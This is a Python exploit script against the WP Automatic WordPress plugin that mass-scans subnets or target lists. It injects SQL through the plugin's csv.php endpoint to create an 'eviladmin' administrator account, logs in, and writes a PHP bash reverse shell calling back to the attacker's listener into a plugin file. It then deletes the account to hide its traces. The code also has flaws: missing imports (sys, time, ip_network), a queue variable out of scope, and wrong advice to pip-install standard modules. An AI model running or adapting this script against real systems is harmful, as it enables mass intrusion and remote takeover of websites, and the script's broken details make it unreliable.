import argparse
import hashlib
import logging
import queue
import re
import requests
from requests.exceptions import RequestException
import threading

# Set up logging
logger = logging.getLogger(__name__)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
    ],
)

# Parse command line arguments
parser = argparse.ArgumentParser(description="Exploit WP Automatic plugin vulnerability.")
parser.add_argument("--lhost", default="127.0.0.1", help="The IP address of the listener (default: 127.0.0.1)")
parser.add_argument("--lport", type=int, default=1414, help="The port number of the listener (default: 1414)")
parser.add_argument("--threads", type=int, default=10, help="The number of threads to use (default: 10)")
parser.add_argument("--targets", help="The path to a file containing a list of targets (one per line)")
parser.add_argument("--subnet", help="The subnet to scan (e.g. 192.168.1.0/24)")
args = parser.parse_args()

lhost = args.lhost
lport = args.lport
threads = args.threads
targets_file = args.targets
subnet = args.subnet

# Automatic target scanner
def scan_subnet(subnet):
    # Note: You'll need to install the ipaddress module to use ip_network
    # You can install it using pip: pip install ipaddress
    for ip in ip_network(subnet).hosts():
        url = f"http://{str(ip)}/wordpress"
        q.put(url)

# Read targets from file
def read_targets(targets_file):
    with open(targets_file, "r") as f:
        for line in f:
            url = line.strip()
            q.put(url)

# Generate dynamic values for exploitation
def get_user_agent():
    # Generate a random User-Agent string
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like
```
Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0"
]
    return user_agents[int(hashlib.md5(str(time.time()).encode()).hexdigest(), 16) % len(user_agents)]

def get_integ_hash(query):
    # Generate a dynamic MD5 hash for the 'integ' parameter
    return hashlib.md5(query.encode()).hexdigest()

# Exploit functions
def insert_user(wp_automatic_url, headers):
    user_data = {
        "q": "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')",
        "auth": " ",
        "integ": get_integ_hash(
            "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')"
        ),
    }
    try:
        r = requests.post(wp_automatic_url, headers=headers, data=user_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return None
    logger.info(f"Response: {r.text}")
    return r

def find_user_id(wp_automatic_url, headers):
    max_id = 1000
    for id in range(0, max_id):
        user_query = "SELECT * FROM `wp_users` WHERE user_login='eviladmin' AND ID=" + str(id)
        integ_hash = get_integ_hash(user_query)
        data = {"q": user_query, "integ": integ_hash}
        try:
            response = requests.post(wp_automatic_url, headers=headers, data=data)
        except RequestException as e:
            logger.error(f"Request failed: {e}")
            return None
        logger.info(f"Response: {response.text}")
        if ",,," in response.text:
            return str(id)
    return None

def add_admin_role(wp_automatic_url, headers, user_id):
    if user_id is None:
        logger.error("Failed to find user ID")
        return None
    role_data = {
        "q": f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1{{s:13:\"administrator\";s:1:\"1\";}}')",
        "auth": " ",
        "integ": get_integ_hash(
            f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1{{s:13:\"administrator\";s:1:\"1\";}}')"
        ),
    }
    try:
        r = requests.post(wp_automatic_url, headers=headers, data=role_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return None
    logger.info(f"Response: {r.text}")
    return r

def upload_shell(domain, headers, nonce):
    upload_url = domain + "/wp-admin/admin-ajax.php"
    payload_data = {
        "nonce": nonce,
        "_wp_http_referer": "/wordpress/wp-admin/plugin-editor.php?file=wp-automatic%2Findex.php&plugin=wp-automatic%2Fwp-automatic.php",
        "newcontent": f"<?php \nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");\n?>",
        "action": "edit-theme-plugin-file",
        "file": "wp-automatic/index.php",
        "plugin": "wp-automatic/wp-automatic.php",
        "docs-list": "",
    }
    try:
        r = requests.post(upload_url, headers=headers, data=payload_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return None
    logger.info(f"Response: {r.text}")
    return r

# Main exploit function
def exploit(url):
    try:
        domain = url
        wp_automatic_url = domain + "/wp-content/plugins/wp-automatic/inc/csv.php"
        headers = {
            "User-Agent": get_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        # Check if the WP Automatic plugin is installed
        check_data = {
            "q": "SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%'",
            "auth": " ",
            "integ": get_integ_hash("SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%'"),
        }
        r = requests.post(wp_automatic_url, headers=headers, data=check_data)
        if "wp-automatic" in r.text:
            logger.info(f"WP Automatic plugin found on {url}")

            # Insert new user
            insert_user_response = insert_user(wp_automatic_url, headers)
            if insert_user_response is None:
                logger.error(f"Failed to insert user on {url}")
                return

            # Find ID of the user we just inserted
            user_id = find_user_id(wp_automatic_url, headers)
            if user_id is None:
                logger.error(f"Failed to find user ID on {url}")
                return

            # Add Role Administrator to the user
            add_admin_role_response = add_admin_role(wp_automatic_url, headers, user_id)
            if add_admin_role_response is None:
                logger.error(f"Failed to add administrator role on {url}")
                return

            logger.info(f"Successfully added Administrator account: eviladmin on {url}")

            # Login
            login_url = domain + "/wp-login.php"
            login_data = {
                "log": "eviladmin",
                "pwd": "eviladmin",
                "wp-submit": "Log In",
                "redirect_to": "http://localhost/wordpress/wp-admin/users.php",
                "testcookie": "1",
            }
            session = requests.session()
            session.post(login_url, headers=headers, data=login_data)

            # Upload the shell
            edit_wp_automatic_url = domain + "/wp-admin/plugin-editor.php?plugin=wp-automatic%2Findex.php&Submit=Select"
            r = session.get(edit_wp_automatic_url, headers=headers)
            match = re.search(r'<input type="hidden" id="nonce" name="nonce" value="([^"]+)" />', r.text)
            if match is not None:
                nonce = match.group(1)
            else:
                logger.error(f"Nonce not found in response")
                return

            if nonce:
                upload_shell_response = upload_shell(domain, headers, nonce)
                if upload_shell_response is None:
                    logger.error(f"Failed to upload shell on {url}")
                    return

                logger.info(f"Reverse shell is being sent to {url}")
                shell_url = domain + "/wp-content/plugins/wp-automatic/index.php"
                r = requests.get(shell_url, headers=headers)
                logger.info(f"Shell has been executed on {url}")

                # Clean up
                delete_user_query = f"DELETE FROM wp_users WHERE ID={user_id}"
                delete_user_data = {"q": delete_user_query, "integ": get_integ_hash(delete_user_query)}
                session.post(wp_automatic_url, headers=headers, data=delete_user_data)

                delete_usermeta_query = f"DELETE FROM wp_usermeta WHERE user_id={user_id}"
                delete_usermeta_data = {"q": delete_usermeta_query, "integ": get_integ_hash(delete_usermeta_query)}
                session.post(wp_automatic_url, headers=headers, data=delete_usermeta_data)
            else:
                logger.error(f"Nonce not found on {url}. Shell upload failed.")
        else:
            logger.info(f"WP Automatic plugin not found on {url}")
    except Exception as e:
        logger.error(f"Error exploiting {url}: {e}")

# Main function
def main():
    # Note: You'll need to install the queue module to use queue.Queue
    # You can install it using pip: pip install queue
    q = queue.Queue()
    for i in range(threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    # Add targets to the queue
    if targets_file:
        read_targets(targets_file)
    elif subnet:
        scan_subnet(subnet)
    else:
        logger.error("You must specify either --targets or --subnet")
        sys.exit(1)

    # Wait for all targets to be processed
    q.join()

# Worker function
def worker(q):
    while True:
        url = q.get()
        try:
            exploit(url)
        except Exception as e:
            logger.error(f"Error processing target {url}: {e}")
        finally:
            q.task_done()

if __name__ == "__main__":
    main()
